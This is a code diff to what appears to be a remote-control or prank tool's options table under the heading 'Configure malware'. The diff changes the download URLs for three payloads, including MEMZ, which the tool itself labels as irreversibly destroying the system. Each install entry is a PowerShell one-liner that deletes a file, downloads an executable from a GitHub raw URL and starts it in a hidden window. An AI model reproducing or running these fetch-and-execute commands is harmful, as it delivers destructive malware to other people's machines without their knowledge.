@@ -26,15 +26,15 @@ GLOBAL_OPTIONS = { # Create the structure for all user options and commands
     
     "Configure malware": {
         "Salinewin.exe": {
-            "Install (non-destructive, purely effects)": "Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\saline.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/saline/main/salinewin1.5-safety.exe' -OutFile 'C:\\win64\\saline.exe'; Start-Process 'C:\\win64\\saline.exe' -WindowStyle hidden",
+            "Install (non-destructive, purely effects)": "Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\saline.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/salinewin1.5-safety.exe' -OutFile 'C:\\win64\\saline.exe'; Start-Process 'C:\\win64\\saline.exe' -WindowStyle hidden",
             "Stop": "Get-Process 'saline' | Stop-Process -Force"
         },
         "Memz.exe": {
-            "Install \u001b[31m(irreversibly destroys system)\u001b[90m": "Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\memz.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/memz/main/MEMZ.exe' -OutFile 'C:\\win64\\memz.exe'; Start-Process 'C:\\win64\\memz.exe' -WindowStyle hidden",
+            "Install \u001b[31m(irreversibly destroys system)\u001b[90m": "Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\mz.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/memz.exe' -OutFile 'C:\\win64\\mz.exe'; Start-Process 'C:\\win64\\mz.exe' -WindowStyle hidden",
             "Stop": "Get-Process 'memz' | Stop-Process -Force"
         },
         "ButterflyOnDesktop.exe": {
-            "Install (non-destructive, but closed source)": "if(Test-Path 'C:\\win64\\bfly.exe'){for($i=0;$i -lt 5;$i++){Start-Process 'C:\\win64\\bfly.exe'}}else{Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\bfly.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/butterfly/main/bfly.exe' -OutFile 'C:\\win64\\bfly.exe'; Start-Process 'C:\\win64\\bfly.exe' -WindowStyle hidden}",
+            "Install (non-destructive, but closed source)": "if(Test-Path 'C:\\win64\\bfly.exe'){for($i=0;$i -lt 5;$i++){Start-Process 'C:\\win64\\bfly.exe'}}else{Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\bfly.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/bod.exe' -OutFile 'C:\\win64\\bfly.exe'; Start-Process 'C:\\win64\\bfly.exe' -WindowStyle hidden}",
             "Stop": "Get-Process 'bfly' | Stop-Process -Force"
         }
     },
